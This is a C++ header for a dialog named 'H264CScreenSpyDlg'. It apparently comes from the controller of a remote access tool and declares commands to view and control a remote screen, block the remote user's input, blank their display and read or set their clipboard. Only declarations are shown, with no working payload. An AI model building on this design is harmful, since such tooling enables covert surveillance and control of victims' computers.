#pragma once

#include "CursorInfo.h"
#include "MovieMaker.h"
#include <sdl/SDL.h>
#include <libavcodec/avcodec.h>



#ifdef _DEBUG
#pragma comment(lib, "SDL2_32_d.lib")
#else
#pragma comment(lib, "SDL2_32_r.lib")

#endif




/////////////////////////////////////////////////////////////////////////////
// H264CScreenSpyDlg dialog
enum
{
	COMMAND_NEXT_H264CScreenSpyDlg,
	COMMAND_h264_SHOW_Cursor,
	COMMAND_h264_HIDE_Cursor,
	COMMAND_h264_SCREEN_RESET,
	COMMAND_h264_SCREEN_CONTROL,
	COMMAND_h264_SCREEN_BLOCK_INPUT,
	COMMAND_h264_SCREEN_BLANK,
	COMMAND_h264_SCREEN_CAPTURE_LAYER,
	COMMAND_h264_SCREEN_GET_CLIPBOARD,
	COMMAND_h264_SCREEN_SET_CLIPBOARD,
	COMMAND_h264_SCREEN_CHANGE_MONITORS,
	TOKEN_H264SCREEN,
	TOKEN_h264CLIPBOARD_TEXT,


};



typedef void(__cdecl* fnavcodec_register_all)(void); 
typedef AVCodec* (__cdecl* fnavcodec_find_decoder)(BYTE nId);
typedef AVCodecContext* (__cdecl* fnavcodec_alloc_context3)(const AVCodec* codec);
typedef int(__cdecl* fnavcodec_open2)(AVCodecContext* avctx, const AVCodec* codec, AVDictionary** options);
typedef void(__cdecl* fnav_init_packet)(AVPacket* pkt);
typedef int(__cdecl* fnav_new_packet)(AVPacket* pkt, int size);
typedef int(__cdecl* fnavcodec_send_packet)(AVCodecContext* avctx, const AVPacket* avpkt);
typedef void(__cdecl* fnav_packet_unref)(AVPacket* pkt);
typedef int(__cdecl* fnavcodec_receive_frame)(AVCodecContext* avctx, AVFrame* frame);
typedef int(__cdecl* fnavcodec_close)(AVCodecContext* avctx);
typedef void(__cdecl* fnavcodec_free_context)(AVCodecContext** avctx);

typedef AVFrame* (__cdecl* fnav_frame_alloc)(void);
typedef void(__cdecl* fnav_frame_free)(AVFrame** frame);
typedef void(__cdecl* fnav_frame_unref)(AVFrame* frame);

//起始标志+包类型+长度+正文长度正文  正文
struct PacketHead
{
	//0xffffffff  uint32 max
	uint32_t start_sign;
	//类型
	uint32_t type;
	//正文长度
	uint32_t len;
};


struct ReadyData
{
	unsigned int video_L;
	unsigned int video_T;

	unsigned int video_w;
	unsigned int video_h;
};

struct PacketReadyData
{
	PacketHead head;
	ReadyData data;
	int i;
};


struct Context
{
	HWND hwnd;
	AVCodec* codec;
	AVCodecContext* codecCtx;
	volatile bool enableDraw;
};

class H264CScreenSpyDlg : public CDialog
{
	// Construction
public:
	H264CScreenSpyDlg(CWnd* pParent = NULL, ISocketBase* pIOCPServer = NULL, ClientContext* pContext = NULL);   // standard constructor
	void OnReceiveComplete();
	void OnReceive();
	// Dialog Data
		//{{AFX_DATA(H264CScreenSpyDlg)
	enum { IDD = IDD_SCREENSPY };
	// NOTE: the ClassWizard will add data members here
//}}AFX_DATA
public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual void PostNcDestroy();
	virtual void OnCancel();
// Implementation
protected:

	// Generated message map functions
	//{{AFX_MSG(H264CScreenSpyDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	//afx_msg void OnClose();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnTimer(UINT nIDEvent);
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
private:

	SOCKET icopsocket;
	CRect CLIENTRECT;
	int clienr, clientt;
	double           m_wZoom;            // 屏幕横向缩放比
	double           m_hZoom;            // 屏幕纵向缩放比

	BOOL m_bOnClose;
	//CRect rectDlg;
	CString m_aviFile; // 录像文件名。如果文件名不为空就写入
	//CBmpToAvi	m_aviStream;
	MovieMaker* m_avi;
	HICON	m_hIcon;
	RECT	m_rcRestore;
	BOOL	m_bWinArrange;
	BOOL	m_bSnapSizing;
	HDC		m_hCurrWndDC;
	HDC		m_hLastMemDC;
	HBITMAP	m_hLastBitmap;
	LPVOID	m_lpvLastBits;
	LPVOID	m_lpvRectBits;

	//CRITICAL_SECTION m_cs;


	HCURSOR	m_hRemoteCursor;
	POINT	m_LastCursorPos;
	BYTE	m_LastCursorIndex;
	CCursorInfo	m_CursorInfo;


	bool SaveSnapshot();
	void UpdateLocalClipboard(char* buf, int len);
	void SendLocalClipboard();
	bool m_bIsFirst;
	bool m_bIsFullScreen;
	bool m_bIsTraceCursor;
	MYtagMSG* m_MYtagMSG;
	int m_MYtagMSGsize;
	ClientContext* m_pContext;
	ISocketBase* m_iocpServer;
	CString m_IPAddress;
	UINT m_nCount;
	int alldata;
	bool m_bIsCtrl;

	PacketReadyData readpkg;

	int iMonitors;
	Context* context;
	SDL_Texture* sdlTexture;
	SDL_Rect sdlRect;
	int pkg_size;
	int window_w, window_h;
	AVFrame* yuvFrame;
	PacketHead pkghead;
	int rn;
	SDL_Renderer* renderer;
	SDL_Window* window;
	AVPacket packet;
	int on;
	ReadyData readyData;
	void DrawScreen();
	void StopScreen();
	void ResetScreen(bool reset);
	 




public:
	/*HMEMORYMODULE handle_sdl;
	HMEMORYMODULE handle_avcode;
	HMEMORYMODULE handle_acutil;*/





	fnavcodec_register_all		MYavcodec_register_all;
	fnavcodec_find_decoder		MYavcodec_find_decoder;
	fnavcodec_alloc_context3	MYavcodec_alloc_context3;
	fnavcodec_open2				MYavcodec_open2;
	fnav_init_packet			MYav_init_packet;
	fnav_new_packet				MYav_new_packet;
	fnavcodec_send_packet		MYavcodec_send_packet;
	fnav_packet_unref			MYav_packet_unref;
	fnavcodec_receive_frame		MYavcodec_receive_frame;
	fnavcodec_close				MYavcodec_close;
	fnavcodec_free_context		MYavcodec_free_context;


	fnav_frame_alloc		MYav_frame_alloc;
	fnav_frame_free			MYav_frame_free;
	fnav_frame_unref		MYav_frame_unref;

};

